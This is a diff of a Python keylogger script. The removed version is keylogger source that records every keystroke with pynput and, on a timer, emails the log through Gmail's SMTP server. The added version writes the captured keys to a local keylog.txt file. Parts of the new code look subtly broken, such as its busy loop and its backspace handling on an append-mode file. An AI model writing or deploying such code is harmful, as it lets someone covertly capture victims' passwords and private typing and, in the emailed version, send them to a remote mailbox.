@@ -1,77 +1,41 @@
-#!/usr/bin/env python
+import pynput.keyboard
 
-import smtplib
+#### Global variable to store pressed keys
+logged_keys = []
 
-import threading
+def on_press(key):
+    try:
+        ### Convert the key to a string and append to the list
+        logged_keys.append(key.char)
+    except AttributeError:
+        ### If a special key (e.g., shift, ctrl, etc.) is pressed, log it as it is
+        logged_keys.append(str(key))
 
-import pynput
-
-# Create Keylogger Class
-from pynput import keyboard
-
-
-class KeyLogger:
-
-    # Define __init__ variables
-
-    def __init__(self, time_interval: int, email: str, password: str) -> None:
-        """
-
-        :rtype: object
-        """
-        self.interval = time_interval
-        self.log = "KeyLogger has started..."
-        self.email = email
-        self.password = password
-
-    # Create Log which all keystrokes will be appended to
-
-    def append_to_log(self, string):
-        assert isinstance(string, str)
-        self.log = self.log + string
-
-    # Create Keylogger
-
-    def on_press(self, key):
-        try:
-            current_key = str(key.char)
-        except AttributeError:
-            if key == key.space:
-                current_key = " "
-            elif key == key.esc:
-                print("Exiting program...")
-                return False
+def write_to_file(keys):
+    # Open the log file in append mode
+    with open("keylog.txt", "a") as f:
+        for key in keys:
+            # If Enter key is pressed, start a new line
+            if key == 'Key.enter':
+                f.write('\n')
+            # If Backspace key is pressed, remove the last character from the log
+            elif key == 'Key.backspace':
+                f.seek(0, 2)  # Move the cursor to the end of the file
+                f.seek(f.tell() - 1, 0)  # Move the cursor back by 1 character
+                f.truncate()  # Delete the last character
             else:
-                current_key = " " + str(key) + " "
+                f.write(key)
+                f.write(' ')
 
-        self.append_to_log(current_key)
+def on_release(key):
+    if key == pynput.keyboard.Key.esc:
+        # If Esc key is pressed, stop the listener
+        return False
 
-
-    # Create underlying back structure which will publish emails
-
-    def send_mail(self, email, password, message):
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
-        server.quit()
-
-    # Create Report & Send Email
-
-    def report_n_send(self) -> str:
-        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
-        self.log = ""
-        timer = threading.Timer(self.interval, self.report_n_send)
-        timer.start()
-
-    # Start KeyLogger and Send Off Emails
-
-    def start(self) -> str:
-        """
-
-        :rtype: object
-        """
-        keyboard_listener = keyboard.Listener(on_press = self.on_press)
-        with keyboard_listener:
-            self.report_n_send()
-            keyboard_listener.join()
+# Start listening for key events
+with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    # Continuously write logged keys to the file
+    while True:
+        if len(logged_keys) > 0:
+            write_to_file(logged_keys)
+            logged_keys = []  # Clear the logged keys
